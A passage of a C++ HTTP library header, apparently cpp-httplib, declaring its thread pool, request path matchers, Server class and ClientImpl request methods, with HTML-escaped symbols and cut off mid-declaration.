  Response() = default;
  Response(const Response &amp;) = default;
  Response &amp;operator=(const Response &amp;) = default;
  Response(Response &amp;&amp;) = default;
  Response &amp;operator=(Response &amp;&amp;) = default;
  ~Response() {
    if (content_provider_resource_releaser_) {
      content_provider_resource_releaser_(content_provider_success_);
    }
  }

  // private members...
  size_t content_length_ = 0;
  ContentProvider content_provider_;
  ContentProviderResourceReleaser content_provider_resource_releaser_;
  bool is_chunked_content_provider_ = false;
  bool content_provider_success_ = false;
  std::string file_content_path_;
  std::string file_content_content_type_;
};

class Stream {
public:
  virtual ~Stream() = default;

  virtual bool is_readable() const = 0;
  virtual bool is_writable() const = 0;

  virtual ssize_t read(char *ptr, size_t size) = 0;
  virtual ssize_t write(const char *ptr, size_t size) = 0;
  virtual void get_remote_ip_and_port(std::string &amp;ip, int &amp;port) const = 0;
  virtual void get_local_ip_and_port(std::string &amp;ip, int &amp;port) const = 0;
  virtual socket_t socket() const = 0;

  virtual time_t duration() const = 0;

  ssize_t write(const char *ptr);
  ssize_t write(const std::string &amp;s);
};

class TaskQueue {
public:
  TaskQueue() = default;
  virtual ~TaskQueue() = default;

  virtual bool enqueue(std::function&lt;void()&gt; fn) = 0;
  virtual void shutdown() = 0;

  virtual void on_idle() {}
};

class ThreadPool final : public TaskQueue {
public:
  explicit ThreadPool(size_t n, size_t mqr = 0)
      : shutdown_(false), max_queued_requests_(mqr) {
    while (n) {
      threads_.emplace_back(worker(*this));
      n--;
    }
  }

  ThreadPool(const ThreadPool &amp;) = delete;
  ~ThreadPool() override = default;

  bool enqueue(std::function&lt;void()&gt; fn) override {
    {
      std::unique_lock&lt;std::mutex&gt; lock(mutex_);
      if (max_queued_requests_ &gt; 0 &amp;&amp; jobs_.size() &gt;= max_queued_requests_) {
        return false;
      }
      jobs_.push_back(std::move(fn));
    }

    cond_.notify_one();
    return true;
  }

  void shutdown() override {
    // Stop all worker threads...
    {
      std::unique_lock&lt;std::mutex&gt; lock(mutex_);
      shutdown_ = true;
    }

    cond_.notify_all();

    // Join...
    for (auto &amp;t : threads_) {
      t.join();
    }
  }

private:
  struct worker {
    explicit worker(ThreadPool &amp;pool) : pool_(pool) {}

    void operator()() {
      for (;;) {
        std::function&lt;void()&gt; fn;
        {
          std::unique_lock&lt;std::mutex&gt; lock(pool_.mutex_);

          pool_.cond_.wait(
              lock, [&amp;] { return !pool_.jobs_.empty() || pool_.shutdown_; });

          if (pool_.shutdown_ &amp;&amp; pool_.jobs_.empty()) { break; }

          fn = pool_.jobs_.front();
          pool_.jobs_.pop_front();
        }

        assert(true == static_cast&lt;bool&gt;(fn));
        fn();
      }

#if defined(CPPHTTPLIB_OPENSSL_SUPPORT) &amp;&amp; !defined(OPENSSL_IS_BORINGSSL) &amp;&amp;   \
    !defined(LIBRESSL_VERSION_NUMBER)
      OPENSSL_thread_stop();
#endif
    }

    ThreadPool &amp;pool_;
  };
  friend struct worker;

  std::vector&lt;std::thread&gt; threads_;
  std::list&lt;std::function&lt;void()&gt;&gt; jobs_;

  bool shutdown_;
  size_t max_queued_requests_ = 0;

  std::condition_variable cond_;
  std::mutex mutex_;
};

using Logger = std::function&lt;void(const Request &amp;, const Response &amp;)&gt;;

using SocketOptions = std::function&lt;void(socket_t sock)&gt;;

namespace detail {

bool set_socket_opt_impl(socket_t sock, int level, int optname,
                         const void *optval, socklen_t optlen);
bool set_socket_opt(socket_t sock, int level, int optname, int opt);
bool set_socket_opt_time(socket_t sock, int level, int optname, time_t sec,
                         time_t usec);

} // namespace detail

void default_socket_options(socket_t sock);

const char *status_message(int status);

std::string get_bearer_token_auth(const Request &amp;req);

namespace detail {

class MatcherBase {
public:
  virtual ~MatcherBase() = default;

  // Match request path and populate its matches and
  virtual bool match(Request &amp;request) const = 0;
};

/**
 * Captures parameters in request path and stores them in Request::path_params
 *
 * Capture name is a substring of a pattern from : to /.
 * The rest of the pattern is matched agains the request path directly
 * Parameters are captured starting from the next character after
 * the end of the last matched static pattern fragment until the next /.
 *
 * Example pattern:
 * "/path/fragments/:capture/more/fragments/:second_capture"
 * Static fragments:
 * "/path/fragments/", "more/fragments/"
 *
 * Given the following request path:
 * "/path/fragments/:1/more/fragments/:2"
 * the resulting capture will be
 * {{"capture", "1"}, {"second_capture", "2"}}
 */
class PathParamsMatcher final : public MatcherBase {
public:
  PathParamsMatcher(const std::string &amp;pattern);

  bool match(Request &amp;request) const override;

private:
  // Treat segment separators as the end of path parameter capture
  // Does not need to handle query parameters as they are parsed before path
  // matching
  static constexpr char separator = '/';

  // Contains static path fragments to match against, excluding the '/' after
  // path params
  // Fragments are separated by path params
  std::vector&lt;std::string&gt; static_fragments_;
  // Stores the names of the path parameters to be used as keys in the
  // Request::path_params map
  std::vector&lt;std::string&gt; param_names_;
};

/**
 * Performs std::regex_match on request path
 * and stores the result in Request::matches
 *
 * Note that regex match is performed directly on the whole request.
 * This means that wildcard patterns may match multiple path segments with /:
 * "/begin/(.*)/end" will match both "/begin/middle/end" and "/begin/1/2/end".
 */
class RegexMatcher final : public MatcherBase {
public:
  RegexMatcher(const std::string &amp;pattern) : regex_(pattern) {}

  bool match(Request &amp;request) const override;

private:
  std::regex regex_;
};

ssize_t write_headers(Stream &amp;strm, const Headers &amp;headers);

} // namespace detail

class Server {
public:
  using Handler = std::function&lt;void(const Request &amp;, Response &amp;)&gt;;

  using ExceptionHandler =
      std::function&lt;void(const Request &amp;, Response &amp;, std::exception_ptr ep)&gt;;

  enum class HandlerResponse {
    Handled,
    Unhandled,
  };
  using HandlerWithResponse =
      std::function&lt;HandlerResponse(const Request &amp;, Response &amp;)&gt;;

  using HandlerWithContentReader = std::function&lt;void(
      const Request &amp;, Response &amp;, const ContentReader &amp;content_reader)&gt;;

  using Expect100ContinueHandler =
      std::function&lt;int(const Request &amp;, Response &amp;)&gt;;

  Server();

  virtual ~Server();

  virtual bool is_valid() const;

  Server &amp;Get(const std::string &amp;pattern, Handler handler);
  Server &amp;Post(const std::string &amp;pattern, Handler handler);
  Server &amp;Post(const std::string &amp;pattern, HandlerWithContentReader handler);
  Server &amp;Put(const std::string &amp;pattern, Handler handler);
  Server &amp;Put(const std::string &amp;pattern, HandlerWithContentReader handler);
  Server &amp;Patch(const std::string &amp;pattern, Handler handler);
  Server &amp;Patch(const std::string &amp;pattern, HandlerWithContentReader handler);
  Server &amp;Delete(const std::string &amp;pattern, Handler handler);
  Server &amp;Delete(const std::string &amp;pattern, HandlerWithContentReader handler);
  Server &amp;Options(const std::string &amp;pattern, Handler handler);

  bool set_base_dir(const std::string &amp;dir,
                    const std::string &amp;mount_point = std::string());
  bool set_mount_point(const std::string &amp;mount_point, const std::string &amp;dir,
                       Headers headers = Headers());
  bool remove_mount_point(const std::string &amp;mount_point);
  Server &amp;set_file_extension_and_mimetype_mapping(const std::string &amp;ext,
                                                  const std::string &amp;mime);
  Server &amp;set_default_file_mimetype(const std::string &amp;mime);
  Server &amp;set_file_request_handler(Handler handler);

  template &lt;class ErrorHandlerFunc&gt;
  Server &amp;set_error_handler(ErrorHandlerFunc &amp;&amp;handler) {
    return set_error_handler_core(
        std::forward&lt;ErrorHandlerFunc&gt;(handler),
        std::is_convertible&lt;ErrorHandlerFunc, HandlerWithResponse&gt;{});
  }

  Server &amp;set_exception_handler(ExceptionHandler handler);
  Server &amp;set_pre_routing_handler(HandlerWithResponse handler);
  Server &amp;set_post_routing_handler(Handler handler);

  Server &amp;set_expect_100_continue_handler(Expect100ContinueHandler handler);
  Server &amp;set_logger(Logger logger);

  Server &amp;set_address_family(int family);
  Server &amp;set_tcp_nodelay(bool on);
  Server &amp;set_ipv6_v6only(bool on);
  Server &amp;set_socket_options(SocketOptions socket_options);

  Server &amp;set_default_headers(Headers headers);
  Server &amp;
  set_header_writer(std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer);

  Server &amp;set_keep_alive_max_count(size_t count);
  Server &amp;set_keep_alive_timeout(time_t sec);

  Server &amp;set_read_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  Server &amp;set_read_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  Server &amp;set_write_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  Server &amp;set_write_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  Server &amp;set_idle_interval(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  Server &amp;set_idle_interval(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  Server &amp;set_payload_max_length(size_t length);

  bool bind_to_port(const std::string &amp;host, int port, int socket_flags = 0);
  int bind_to_any_port(const std::string &amp;host, int socket_flags = 0);
  bool listen_after_bind();

  bool listen(const std::string &amp;host, int port, int socket_flags = 0);

  bool is_running() const;
  void wait_until_ready() const;
  void stop();
  void decommission();

  std::function&lt;TaskQueue *(void)&gt; new_task_queue;

protected:
  bool process_request(Stream &amp;strm, const std::string &amp;remote_addr,
                       int remote_port, const std::string &amp;local_addr,
                       int local_port, bool close_connection,
                       bool &amp;connection_closed,
                       const std::function&lt;void(Request &amp;)&gt; &amp;setup_request);

  std::atomic&lt;socket_t&gt; svr_sock_{INVALID_SOCKET};
  size_t keep_alive_max_count_ = CPPHTTPLIB_KEEPALIVE_MAX_COUNT;
  time_t keep_alive_timeout_sec_ = CPPHTTPLIB_KEEPALIVE_TIMEOUT_SECOND;
  time_t read_timeout_sec_ = CPPHTTPLIB_SERVER_READ_TIMEOUT_SECOND;
  time_t read_timeout_usec_ = CPPHTTPLIB_SERVER_READ_TIMEOUT_USECOND;
  time_t write_timeout_sec_ = CPPHTTPLIB_SERVER_WRITE_TIMEOUT_SECOND;
  time_t write_timeout_usec_ = CPPHTTPLIB_SERVER_WRITE_TIMEOUT_USECOND;
  time_t idle_interval_sec_ = CPPHTTPLIB_IDLE_INTERVAL_SECOND;
  time_t idle_interval_usec_ = CPPHTTPLIB_IDLE_INTERVAL_USECOND;
  size_t payload_max_length_ = CPPHTTPLIB_PAYLOAD_MAX_LENGTH;

private:
  using Handlers =
      std::vector&lt;std::pair&lt;std::unique_ptr&lt;detail::MatcherBase&gt;, Handler&gt;&gt;;
  using HandlersForContentReader =
      std::vector&lt;std::pair&lt;std::unique_ptr&lt;detail::MatcherBase&gt;,
                            HandlerWithContentReader&gt;&gt;;

  static std::unique_ptr&lt;detail::MatcherBase&gt;
  make_matcher(const std::string &amp;pattern);

  Server &amp;set_error_handler_core(HandlerWithResponse handler, std::true_type);
  Server &amp;set_error_handler_core(Handler handler, std::false_type);

  socket_t create_server_socket(const std::string &amp;host, int port,
                                int socket_flags,
                                SocketOptions socket_options) const;
  int bind_internal(const std::string &amp;host, int port, int socket_flags);
  bool listen_internal();

  bool routing(Request &amp;req, Response &amp;res, Stream &amp;strm);
  bool handle_file_request(const Request &amp;req, Response &amp;res,
                           bool head = false);
  bool dispatch_request(Request &amp;req, Response &amp;res,
                        const Handlers &amp;handlers) const;
  bool dispatch_request_for_content_reader(
      Request &amp;req, Response &amp;res, ContentReader content_reader,
      const HandlersForContentReader &amp;handlers) const;

  bool parse_request_line(const char *s, Request &amp;req) const;
  void apply_ranges(const Request &amp;req, Response &amp;res,
                    std::string &amp;content_type, std::string &amp;boundary) const;
  bool write_response(Stream &amp;strm, bool close_connection, Request &amp;req,
                      Response &amp;res);
  bool write_response_with_content(Stream &amp;strm, bool close_connection,
                                   const Request &amp;req, Response &amp;res);
  bool write_response_core(Stream &amp;strm, bool close_connection,
                           const Request &amp;req, Response &amp;res,
                           bool need_apply_ranges);
  bool write_content_with_provider(Stream &amp;strm, const Request &amp;req,
                                   Response &amp;res, const std::string &amp;boundary,
                                   const std::string &amp;content_type);
  bool read_content(Stream &amp;strm, Request &amp;req, Response &amp;res);
  bool
  read_content_with_content_receiver(Stream &amp;strm, Request &amp;req, Response &amp;res,
                                     ContentReceiver receiver,
                                     MultipartContentHeader multipart_header,
                                     ContentReceiver multipart_receiver);
  bool read_content_core(Stream &amp;strm, Request &amp;req, Response &amp;res,
                         ContentReceiver receiver,
                         MultipartContentHeader multipart_header,
                         ContentReceiver multipart_receiver) const;

  virtual bool process_and_close_socket(socket_t sock);

  std::atomic&lt;bool&gt; is_running_{false};
  std::atomic&lt;bool&gt; is_decommisioned{false};

  struct MountPointEntry {
    std::string mount_point;
    std::string base_dir;
    Headers headers;
  };
  std::vector&lt;MountPointEntry&gt; base_dirs_;
  std::map&lt;std::string, std::string&gt; file_extension_and_mimetype_map_;
  std::string default_file_mimetype_ = "application/octet-stream";
  Handler file_request_handler_;

  Handlers get_handlers_;
  Handlers post_handlers_;
  HandlersForContentReader post_handlers_for_content_reader_;
  Handlers put_handlers_;
  HandlersForContentReader put_handlers_for_content_reader_;
  Handlers patch_handlers_;
  HandlersForContentReader patch_handlers_for_content_reader_;
  Handlers delete_handlers_;
  HandlersForContentReader delete_handlers_for_content_reader_;
  Handlers options_handlers_;

  HandlerWithResponse error_handler_;
  ExceptionHandler exception_handler_;
  HandlerWithResponse pre_routing_handler_;
  Handler post_routing_handler_;
  Expect100ContinueHandler expect_100_continue_handler_;

  Logger logger_;

  int address_family_ = AF_UNSPEC;
  bool tcp_nodelay_ = CPPHTTPLIB_TCP_NODELAY;
  bool ipv6_v6only_ = CPPHTTPLIB_IPV6_V6ONLY;
  SocketOptions socket_options_ = default_socket_options;

  Headers default_headers_;
  std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; header_writer_ =
      detail::write_headers;
};

enum class Error {
  Success = 0,
  Unknown,
  Connection,
  BindIPAddress,
  Read,
  Write,
  ExceedRedirectCount,
  Canceled,
  SSLConnection,
  SSLLoadingCerts,
  SSLServerVerification,
  SSLServerHostnameVerification,
  UnsupportedMultipartBoundaryChars,
  Compression,
  ConnectionTimeout,
  ProxyConnection,

  // For internal use only
  SSLPeerCouldBeClosed_,
};

std::string to_string(Error error);

std::ostream &amp;operator&lt;&lt;(std::ostream &amp;os, const Error &amp;obj);

class Result {
public:
  Result() = default;
  Result(std::unique_ptr&lt;Response&gt; &amp;&amp;res, Error err,
         Headers &amp;&amp;request_headers = Headers{})
      : res_(std::move(res)), err_(err),
        request_headers_(std::move(request_headers)) {}
  // Response
  operator bool() const { return res_ != nullptr; }
  bool operator==(std::nullptr_t) const { return res_ == nullptr; }
  bool operator!=(std::nullptr_t) const { return res_ != nullptr; }
  const Response &amp;value() const { return *res_; }
  Response &amp;value() { return *res_; }
  const Response &amp;operator*() const { return *res_; }
  Response &amp;operator*() { return *res_; }
  const Response *operator-&gt;() const { return res_.get(); }
  Response *operator-&gt;() { return res_.get(); }

  // Error
  Error error() const { return err_; }

  // Request Headers
  bool has_request_header(const std::string &amp;key) const;
  std::string get_request_header_value(const std::string &amp;key,
                                       const char *def = "",
                                       size_t id = 0) const;
  uint64_t get_request_header_value_u64(const std::string &amp;key,
                                        uint64_t def = 0, size_t id = 0) const;
  size_t get_request_header_value_count(const std::string &amp;key) const;

private:
  std::unique_ptr&lt;Response&gt; res_;
  Error err_ = Error::Unknown;
  Headers request_headers_;
};

class ClientImpl {
public:
  explicit ClientImpl(const std::string &amp;host);

  explicit ClientImpl(const std::string &amp;host, int port);

  explicit ClientImpl(const std::string &amp;host, int port,
                      const std::string &amp;client_cert_path,
                      const std::string &amp;client_key_path);

  virtual ~ClientImpl();

  virtual bool is_valid() const;

  Result Get(const std::string &amp;path);
  Result Get(const std::string &amp;path, const Headers &amp;headers);
  Result Get(const std::string &amp;path, Progress progress);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             Progress progress);
  Result Get(const std::string &amp;path, ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, ContentReceiver content_receiver,
             Progress progress);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ContentReceiver content_receiver, Progress progress);
  Result Get(const std::string &amp;path, ResponseHandler response_handler,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ResponseHandler response_handler,
             ContentReceiver content_receiver);
  Result Get(const std::string &amp;path, ResponseHandler response_handler,
             ContentReceiver content_receiver, Progress progress);
  Result Get(const std::string &amp;path, const Headers &amp;headers,
             ResponseHandler response_handler, ContentReceiver content_receiver,
             Progress progress);

  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, Progress progress = nullptr);
  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, ContentReceiver content_receiver,
             Progress progress = nullptr);
  Result Get(const std::string &amp;path, const Params &amp;params,
             const Headers &amp;headers, ResponseHandler response_handler,
             ContentReceiver content_receiver, Progress progress = nullptr);

  Result Head(const std::string &amp;path);
  Result Head(const std::string &amp;path, const Headers &amp;headers);

  Result Post(const std::string &amp;path);
  Result Post(const std::string &amp;path, const Headers &amp;headers);
  Result Post(const std::string &amp;path, const char *body, size_t content_length,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers, const char *body,
              size_t content_length, const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers, const char *body,
              size_t content_length, const std::string &amp;content_type,
              Progress progress);
  Result Post(const std::string &amp;path, const std::string &amp;body,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const std::string &amp;body,
              const std::string &amp;content_type, Progress progress);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const std::string &amp;body, const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const std::string &amp;body, const std::string &amp;content_type,
              Progress progress);
  Result Post(const std::string &amp;path, size_t content_length,
              ContentProvider content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path,
              ContentProviderWithoutLength content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              size_t content_length, ContentProvider content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              ContentProviderWithoutLength content_provider,
              const std::string &amp;content_type);
  Result Post(const std::string &amp;path, const Params &amp;params);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const Params &amp;params);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const Params &amp;params, Progress progress);
  Result Post(const std::string &amp;path, const MultipartFormDataItems &amp;items);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items, const std::string &amp;boundary);
  Result Post(const std::string &amp;path, const Headers &amp;headers,
              const MultipartFormDataItems &amp;items,
              const MultipartFormDataProviderItems &amp;provider_items);

  Result Put(const std::string &amp;path);
  Result Put(const std::string &amp;path, const char *body, size_t content_length,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers, const char *body,
             size_t content_length, const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers, const char *body,
             size_t content_length, const std::string &amp;content_type,
             Progress progress);
  Result Put(const std::string &amp;path, const std::string &amp;body,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const std::string &amp;body,
             const std::string &amp;content_type, Progress progress);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const std::string &amp;body, const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const std::string &amp;body, const std::string &amp;content_type,
             Progress progress);
  Result Put(const std::string &amp;path, size_t content_length,
             ContentProvider content_provider, const std::string &amp;content_type);
  Result Put(const std::string &amp;path,
             ContentProviderWithoutLength content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             size_t content_length, ContentProvider content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             ContentProviderWithoutLength content_provider,
             const std::string &amp;content_type);
  Result Put(const std::string &amp;path, const Params &amp;params);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const Params &amp;params);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const Params &amp;params, Progress progress);
  Result Put(const std::string &amp;path, const MultipartFormDataItems &amp;items);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items, const std::string &amp;boundary);
  Result Put(const std::string &amp;path, const Headers &amp;headers,
             const MultipartFormDataItems &amp;items,
             const MultipartFormDataProviderItems &amp;provider_items);

  Result Patch(const std::string &amp;path);
  Result Patch(const std::string &amp;path, const char *body, size_t content_length,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const char *body, size_t content_length,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const char *body, size_t content_length,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const char *body, size_t content_length,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const std::string &amp;body,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const std::string &amp;body,
               const std::string &amp;content_type, Progress progress);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const std::string &amp;body, const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               const std::string &amp;body, const std::string &amp;content_type,
               Progress progress);
  Result Patch(const std::string &amp;path, size_t content_length,
               ContentProvider content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path,
               ContentProviderWithoutLength content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               size_t content_length, ContentProvider content_provider,
               const std::string &amp;content_type);
  Result Patch(const std::string &amp;path, const Headers &amp;headers,
               ContentProviderWithoutLength content_provider,
               const std::string &amp;content_type);

  Result Delete(const std::string &amp;path);
  Result Delete(const std::string &amp;path, const Headers &amp;headers);
  Result Delete(const std::string &amp;path, const char *body,
                size_t content_length, const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const char *body,
                size_t content_length, const std::string &amp;content_type,
                Progress progress);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const char *body, size_t content_length,
                const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const char *body, size_t content_length,
                const std::string &amp;content_type, Progress progress);
  Result Delete(const std::string &amp;path, const std::string &amp;body,
                const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const std::string &amp;body,
                const std::string &amp;content_type, Progress progress);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const std::string &amp;body, const std::string &amp;content_type);
  Result Delete(const std::string &amp;path, const Headers &amp;headers,
                const std::string &amp;body, const std::string &amp;content_type,
                Progress progress);

  Result Options(const std::string &amp;path);
  Result Options(const std::string &amp;path, const Headers &amp;headers);

  bool send(Request &amp;req, Response &amp;res, Error &amp;error);
  Result send(const Request &amp;req);

  void stop();

  std::string host() const;
  int port() const;

  size_t is_socket_open() const;
  socket_t socket() const;

  void set_hostname_addr_map(std::map&lt;std::string, std::string&gt; addr_map);

  void set_default_headers(Headers headers);

  void
  set_header_writer(std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer);

  void set_address_family(int family);
  void set_tcp_nodelay(bool on);
  void set_ipv6_v6only(bool on);
  void set_socket_options(SocketOptions socket_options);

  void set_connection_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void
  set_connection_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_read_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void set_read_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_write_timeout(time_t sec, time_t usec = 0);
  template &lt;class Rep, class Period&gt;
  void set_write_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_max_timeout(time_t msec);
  template &lt;class Rep, class Period&gt;
  void set_max_timeout(const std::chrono::duration&lt;Rep, Period&gt; &amp;duration);

  void set_basic_auth(const std::string &amp;username, const std::string &amp;password);
  void set_bearer_token_auth(const std::string &amp;token);
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_digest_auth(const std::string &amp;username,
                       const std::string &amp;password);
#endif

  void set_keep_alive(bool on);
  void set_follow_location(bool on);

  void set_url_encode(bool on);

  void set_compress(bool on);

  void set_decompress(bool on);

  void set_interface(const std::string &amp;intf);

  void set_proxy(const std::string &amp;host, int port);
  void set_proxy_basic_auth(const std::string &amp;username,
                            const std::string &amp;password);
  void set_proxy_bearer_token_auth(const std::string &amp;token);
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_proxy_digest_auth(const std::string &amp;username,
                             const std::string &amp;password);
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void set_ca_cert_path(const std::string &amp;ca_cert_file_path,
                        const std::string &amp;ca_cert_dir_path = std::string());
  void set_ca_cert_store(X509_STORE *ca_cert_store);
  X509_STORE *create_ca_cert_store(const char *ca_cert, std::size_t size) const;
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  void enable_server_certificate_verification(bool enabled);
  void enable_server_hostname_verification(bool enabled);
  void set_server_certificate_verifier(std::function&lt;bool(SSL *ssl)&gt; verifier);
#endif

  void set_logger(Logger logger);

protected:
  struct Socket {
    socket_t sock = INVALID_SOCKET;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
    SSL *ssl = nullptr;
#endif

    bool is_open() const { return sock != INVALID_SOCKET; }
  };

  virtual bool create_and_connect_socket(Socket &amp;socket, Error &amp;error);

  // All of:
  //   shutdown_ssl
  //   shutdown_socket
  //   close_socket
  // should ONLY be called when socket_mutex_ is locked.
  // Also, shutdown_ssl and close_socket should also NOT be called concurrently
  // with a DIFFERENT thread sending requests using that socket.
  virtual void shutdown_ssl(Socket &amp;socket, bool shutdown_gracefully);
  void shutdown_socket(Socket &amp;socket) const;
  void close_socket(Socket &amp;socket);

  bool process_request(Stream &amp;strm, Request &amp;req, Response &amp;res,
                       bool close_connection, Error &amp;error);

  bool write_content_with_provider(Stream &amp;strm, const Request &amp;req,
                                   Error &amp;error) const;

  void copy_settings(const ClientImpl &amp;rhs);

  // Socket endpoint information
  const std::string host_;
  const int port_;
  const std::string host_and_port_;

  // Current open socket
  Socket socket_;
  mutable std::mutex socket_mutex_;
  std::recursive_mutex request_mutex_;

  // These are all protected under socket_mutex
  size_t socket_requests_in_flight_ = 0;
  std::thread::id socket_requests_are_from_thread_ = std::thread::id();
  bool socket_should_be_closed_when_request_is_done_ = false;

  // Hostname-IP map
  std::map&lt;std::string, std::string&gt; addr_map_;

  // Default headers
  Headers default_headers_;

  // Header writer
  std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; header_writer_ =
      detail::write_headers;

  // Settings
  std::string client_cert_path_;
  std::string client_key_path_;

  time_t connection_timeout_sec_ = CPPHTTPLIB_CONNECTION_TIMEOUT_SECOND;
  time_t connection_timeout_usec_ = CPPHTTPLIB_CONNECTION_TIMEOUT_USECOND;
  time_t read_timeout_sec_ = CPPHTTPLIB_CLIENT_READ_TIMEOUT_SECOND;
  time_t read_timeout_usec_ = CPPHTTPLIB_CLIENT_READ_TIMEOUT_USECOND;
  time_t write_timeout_sec_ = CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_SECOND;
  time_t write_timeout_usec_ = CPPHTTPLIB_CLIENT_WRITE_TIMEOUT_USECOND;
  time_t max_timeout_msec_ = CPPHTTPLIB_CLIENT_MAX_TIMEOUT_MSECOND;

  std::string basic_auth_username_;
  std::string basic_auth_password_;
  std::string bearer_token_auth_token_;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  std::string digest_auth_username_;
  std::string digest_auth_password_;
#endif

  bool keep_alive_ = false;
  bool follow_location_ = false;

  bool url_encode_ = true;

  int address_family_ = AF_UNSPEC;
  bool tcp_nodelay_ = CPPHTTPLIB_TCP_NODELAY;
  bool ipv6_v6only_ = CPPHTTPLIB_IPV6_V6ONLY;
  SocketOptions socket_options_ = nullptr;

  bool compress_ = false;
  bool decompress_ = true;

  std::string interface_;

  std::string proxy_host_;
  int proxy_port_ = -1;

  std::string proxy_basic_auth_username_;
  std::string proxy_basic_auth_password_;
  std::string proxy_bearer_token_auth_token_;
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  std::string proxy_digest_auth_username_;
  std::string proxy_digest_auth_password_;
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  std::string ca_cert_file_path_;
  std::string ca_cert_dir_path_;

  X509_STORE *ca_cert_store_ = nullptr;
#endif

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  bool server_certificate_verification_ = true;
  bool server_hostname_verification_ = true;
  std::function&lt;bool(SSL *ssl)&gt; server_certificate_verifier_;
#endif

  Logger logger_;

private:
  bool send_(Request &amp;req, Response &amp;res, Error &amp;error);
  Result send_(Request &amp;&amp;req);

  socket_t create_client_socket(Error &amp;error) const;
  bool read_response_line(Stream &amp;strm, const Request &amp;req,
                          Response &amp;res) const;
  bool write_request(Stream &amp;strm, Request &amp;req, bool close_connection,
                     Error &amp;error);
  bool redirect(Request &amp;req, Response &amp;res, Error &amp;error);
  bool handle_request(Stream &amp;strm, Request &amp;req, Response &amp;res,
                      bool close_connection, Error &amp;error);
  std::unique_ptr&lt;Response&gt; send_with_content_provider(
      Request &amp;req, const char *body, size_t content_length,
      ContentProvider content_provider,
      ContentProviderWithoutLength content_provider_without_length,
      const std::string &amp;content_type, Error &amp;error);
  Result send_with_content_provider(
      const std::string &amp;method, const std::string &amp;path,
      const Headers &amp;headers, const char *body, size_t content_length,
